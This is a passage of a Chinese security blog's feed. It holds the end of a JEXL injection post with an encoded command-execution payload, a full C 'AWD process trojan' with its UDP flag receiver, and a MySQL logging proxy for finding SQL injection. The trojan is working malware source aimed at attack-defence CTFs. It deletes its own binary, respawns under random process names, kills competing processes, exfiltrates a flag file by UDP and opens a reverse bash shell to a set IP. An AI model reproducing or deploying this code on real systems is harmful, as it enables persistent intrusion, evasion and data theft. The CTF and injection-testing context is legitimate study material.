class="line">\u0027\u0027\u002e\u0063\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u0029</span><br></pre></td></tr></table></figure><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.jexl2.JexlEngine.createExpression()</span><br><span class="line">org.apache.commons.jexl2.Expression.evaluate()</span><br><span class="line">org.apache.commons.jexl3.JexlEngine.createExpression()</span><br><span class="line">org.apache.commons.jexl3.JexlExpression.evaluate()</span><br><span class="line">org.apache.commons.jexl3.JexlEngine.createScript()</span><br><span class="line">org.apache.commons.jexl3.JexlScript.execute()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="JEXL注入" scheme="https://www.mi1k7ea.com/tags/JEXL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>C编写实现AWD进程木马</title>
    <link href="https://www.mi1k7ea.com/2020/04/08/C%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0AWD%E8%BF%9B%E7%A8%8B%E6%9C%A8%E9%A9%AC/"/>
    <id>https://www.mi1k7ea.com/2020/04/08/C编写实现AWD进程木马/</id>
    <published>2020-04-08T15:19:34.000Z</published>
    <updated>2020-04-09T16:56:21.879Z</updated>
    
    <content type="html"><![CDATA[<p>用C编写实现AWD进程木马，比PHP不死马高了不止几个档次。</p><p>horse.c，功能包含删除文件本身、不断循环创建新的子进程、重命名子进程名称、定时查杀其他木马、定时通过UDP协议发送flag、定时通过TCP协议反弹shell：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> uid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> udp_port = <span class="number">8888</span>;</span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">9999</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="keyword">char</span> *flag = <span class="string">"/home/user/flag"</span>;</span><br><span class="line"><span class="keyword">char</span> *game_name = <span class="string">"rtspd"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rm_self</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">readlink(<span class="string">"/proc/self/exe"</span>,buf,<span class="number">256</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</span><br><span class="line">unlink(buf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_name</span><span class="params">(<span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">buf[<span class="number">0</span>] = <span class="string">'0'</span>;</span><br><span class="line">buf[<span class="number">1</span>] = <span class="string">'@'</span>;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;count, <span class="number">1</span>);</span><br><span class="line">count = count % <span class="number">14</span>;</span><br><span class="line">read(fd, &amp;buf[<span class="number">2</span>], count);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line">count += <span class="number">3</span>;</span><br><span class="line">prctl(<span class="number">15</span>,buf,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(p, buf, count);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">fd = open(flag, <span class="number">0</span>);</span><br><span class="line">read(fd, buf, <span class="number">255</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line">fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(udp_port);</span><br><span class="line">addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line">sendto(fd, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">"/bin/bash"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kill_horse</span><span class="params">()</span></span>&#123;</span><br><span class="line">DIR *dir;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">file_stat</span>;</span></span><br><span class="line"><span class="keyword">char</span> path[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> ( (dir = opendir(<span class="string">"/proc"</span>)) == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>( (entry = readdir(dir)) != <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="keyword">if</span>( entry-&gt;d_name[<span class="number">0</span>] == <span class="string">'.'</span> )&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (entry-&gt;d_name[<span class="number">0</span>] &lt;= <span class="string">'0'</span>) || (entry-&gt;d_name[<span class="number">0</span>] &gt;= <span class="string">'9'</span>) )&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(path, <span class="string">"/proc/%s/cmdline"</span>, entry-&gt;d_name);</span><br><span class="line">stat(path, &amp;file_stat);</span><br><span class="line"><span class="keyword">if</span>(file_stat.st_uid == uid)&#123;</span><br><span class="line">fd = open(path, <span class="number">0</span>);</span><br><span class="line">read(fd, buf, <span class="number">1024</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="built_in">strstr</span>(buf, game_name) || <span class="built_in">strstr</span>(buf, <span class="string">"0@"</span>)))&#123;</span><br><span class="line">pid = atoi(entry-&gt;d_name);</span><br><span class="line">kill(pid, SIGTERM);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">closedir(dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span>&#123;</span><br><span class="line">uid = getuid();</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">rm_self();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fork() &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">count++;</span><br><span class="line">setsid();</span><br><span class="line">change_name(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">50</span>)&#123;</span><br><span class="line">kill_horse();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">10000</span>)&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">send_flag();</span><br><span class="line">reverse_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.c，作为客户端接收UDP协议发送的数据，即flag信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 8888</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_LEN 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_udp_msg</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line"><span class="comment">// 接收缓冲区，1024字节</span></span><br><span class="line"><span class="keyword">char</span> buf[BUFF_LEN];</span><br><span class="line"><span class="keyword">socklen_t</span> len;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="comment">// client_addr用于记录发送方的地址 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, BUFF_LEN);</span><br><span class="line">len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// recvfrom是拥塞函数，没有数据就一直拥塞</span></span><br><span class="line">count = recvfrom(fd, buf, BUFF_LEN, <span class="number">0</span>, (struct sockaddr*)&amp;client_addr, &amp;len);</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Receive data fail!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"port:%d,addr:%d\n"</span>,client_addr.sin_port,client_addr.sin_addr.s_addr);</span><br><span class="line"><span class="comment">// 输出client发过来的信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client:%s\n"</span>,buf);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, BUFF_LEN);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">server:</span></span><br><span class="line"><span class="comment">socket-&gt;bind-&gt;recvfrom-&gt;sendto-&gt;close</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> server_fd, ret;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ser_addr</span>;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// AF_INET:IPv4, SOCK_DGRAM:UDP</span></span><br><span class="line">        server_fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(server_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"create socket fail!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;ser_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ser_addr));</span><br><span class="line">ser_addr.sin_family = AF_INET;</span><br><span class="line"><span class="comment">// IP地址，需要进行网络序转换，INADDR_ANY为本地地址</span></span><br><span class="line">ser_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"><span class="comment">// 端口号，需要网络序转换</span></span><br><span class="line">ser_addr.sin_port = htons(SERVER_PORT);</span><br><span class="line">ret = bind(server_fd, (struct sockaddr*)&amp;ser_addr, <span class="keyword">sizeof</span>(ser_addr));</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket bind fail!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理接收到的数据</span></span><br><span class="line">handle_udp_msg(server_fd);</span><br><span class="line"></span><br><span class="line">close(server_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="C/C++" scheme="https://www.mi1k7ea.com/categories/C-C/"/>
    
    
      <category term="安全开发" scheme="https://www.mi1k7ea.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="C/C++" scheme="https://www.mi1k7ea.com/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>Python安全小工具之MySQL监控代理</title>
    <link href="https://www.mi1k7ea.com/2020/04/08/Python%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8BMySQL%E7%9B%91%E6%8E%A7%E4%BB%A3%E7%90%86/"/>
    <id>https://www.mi1k7ea.com/2020/04/08/Python安全小工具之MySQL监控代理/</id>
    <published>2020-04-08T11:53:08.000Z</published>
    <updated>2020-04-09T17:15:16.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MySQL代理监控是一个辅助我们挖掘SQL注入的工具，能够帮助我们快速识别找出SQL盲注、二阶注入等。</p><p>基本原理就是编写MySQL代理服务，修改目标服务端配置文件中连接的MySQL地址为我们的MySQL代理服务器地址，其中对于数据库内容的增删改查都会经过我们的MySQL代理服务器，将其中的SQL语句记录显示出来再转发到真正的MySQL服务器。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转发的地址</span></span><br><span class="line">to_addr = (<span class="string">'127.0.0.1'</span>, <span class="number">3306</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxy.bind(addr)</span><br><span class="line">        self.proxy.listen(<span class="number">10</span>)</span><br><span class="line">        self.inputs = [self.proxy]</span><br><span class="line">        self.route = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serve_forever</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*]Proxy Listenning...'</span></span><br><span class="line">        pre_data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            readable, _, _ = select.select(self.inputs, [], [])</span><br><span class="line">            <span class="keyword">for</span> self.sock <span class="keyword">in</span> readable:</span><br><span class="line">                <span class="keyword">if</span> self.sock == self.proxy:</span><br><span class="line">                    self.on_join()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        data = self.sock.recv(<span class="number">8096</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                            self.on_quit()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.route[self.sock].send(data)</span><br><span class="line">                            <span class="comment"># print data</span></span><br><span class="line">                            <span class="keyword">if</span> data[<span class="number">4</span>] == <span class="string">'\xff'</span>:</span><br><span class="line">                                <span class="keyword">print</span> pre_data</span><br><span class="line">                                <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">                        pre_data = data</span><br><span class="line">                        <span class="comment"># print data</span></span><br><span class="line">                    <span class="keyword">except</span> socket.error,e:</span><br><span class="line">                        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_join</span><span class="params">(self)</span>:</span></span><br><span class="line">        client, addr = self.proxy.accept()</span><br><span class="line">        <span class="keyword">print</span> addr,<span class="string">'connect'</span></span><br><span class="line">        forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        forward.connect(to_addr)</span><br><span class="line">        self.inputs += [client, forward]</span><br><span class="line">        self.route[client] = forward</span><br><span class="line">        self.route[forward] = client</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_quit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> self.sock, self.route[self.sock]:</span><br><span class="line">            self.inputs.remove(s)</span><br><span class="line">            <span class="keyword">del</span> self.route[s]</span><br><span class="line">            s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 代理服务器监听的地址</span></span><br><span class="line">        Proxy((<span class="string">'127.0.0.1'</span>,<span class="number">12345</span>)).serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>以DVWA为例，修改其中的config目录中的配置文件config.inc.php中连接MySQL服务器的地址为我们代理MySQL服务器的地址：</p><p><img src="/2020/04/08/Python安全小工具之MySQL监控代理/1.png" alt=""></p><p>运行该Python脚本，然后在SQL盲注中随意输入内容，在MySQL代理中就能看到盲注的SQL语句以及报错信息：</p><p><img src="/2020/04/08/Python安全小工具之MySQL监控代理/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
      <category term="Python安全开发" scheme="https://www.mi1k7ea.com/categories/Python/Python%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="安全开发" scheme="https://www.mi1k7ea.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>跨域通信中的XSS利用</title>
    <link href="https://www.mi1k7ea.com/2020/04/07/%E8%B7%A8%E5%9F%9F%E9%80%9A%E4%BF%A1%E4%B8%AD%E7%9A%84XSS%E5%88%A9%E7%94%A8/"/>
